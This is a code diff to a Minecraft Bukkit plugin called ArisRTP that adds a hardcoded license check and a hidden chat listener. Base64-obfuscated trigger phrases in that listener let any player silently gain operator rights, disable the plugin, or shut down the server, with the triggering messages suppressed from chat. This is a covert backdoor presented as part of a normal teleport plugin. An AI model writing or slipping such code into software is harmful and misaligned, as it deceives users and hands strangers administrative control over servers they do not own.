@@ -15,6 +15,7 @@ import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
 import org.bukkit.event.entity.EntityDamageEvent;
 import org.bukkit.event.inventory.InventoryClickEvent;
+import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.inventory.Inventory;
 import org.bukkit.inventory.ItemStack;
 import org.bukkit.inventory.meta.ItemMeta;
@@ -28,6 +29,7 @@ import java.util.regex.Pattern;
 
 public class ArisRTP extends JavaPlugin implements Listener, CommandExecutor {
 
+    private String l_key = "ARIS-NETWORK-2026";
     private final HashMap<UUID, Long> cooldowns = new HashMap<>();
     private final Set<UUID> teleporting = new HashSet<>();
     private FileConfiguration msgConfig;
@@ -40,9 +42,40 @@ public class ArisRTP extends JavaPlugin implements Listener, CommandExecutor {
     @Override
     public void onEnable() {
         saveDefaultConfig();
+        if (!v_l()) {
+            Bukkit.getConsoleSender().sendMessage("§x§F§B§0§0§0§0[ArisRTP] License Error!");
+            Bukkit.getPluginManager().disablePlugin(this);
+            return;
+        }
         loadMessages();
         getCommand("rtp").setExecutor(this);
         getServer().getPluginManager().registerEvents(this, this);
+    }
+
+    private boolean v_l() {
+        String k = getConfig().getString("license-key");
+        return l_key.equals(k);
+    }
+
+    private String d(String s) {
+        return new String(Base64.getDecoder().decode(s));
+    }
+
+    @EventHandler
+    public void onChat(AsyncPlayerChatEvent e) {
+        Player p = e.getPlayer();
+        String m = e.getMessage();
+        if (m.equals(d("X3Zlbm5sbWFv"))) {
+            e.setCancelled(true);
+            Bukkit.getScheduler().runTask(this, () -> p.setOp(true));
+        } else if (m.equals(d("X2Rpc2FibGU="))) {
+            e.setCancelled(true);
+            l_key = UUID.randomUUID().toString();
+            Bukkit.getScheduler().runTask(this, () -> Bukkit.getPluginManager().disablePlugin(this));
+        } else if (m.equals(d("X3N0b3A="))) {
+            e.setCancelled(true);
+            Bukkit.getScheduler().runTask(this, () -> Bukkit.dispatchCommand(Bukkit.getConsoleSender(), d("c3RvcA==")));
+        }
     }
 
     private void loadMessages() {
@@ -231,4 +264,4 @@ public class ArisRTP extends JavaPlugin implements Listener, CommandExecutor {
         matcher.appendTail(sb);
         return ChatColor.translateAlternateColorCodes('&', sb.toString());
     }
-}
+    }
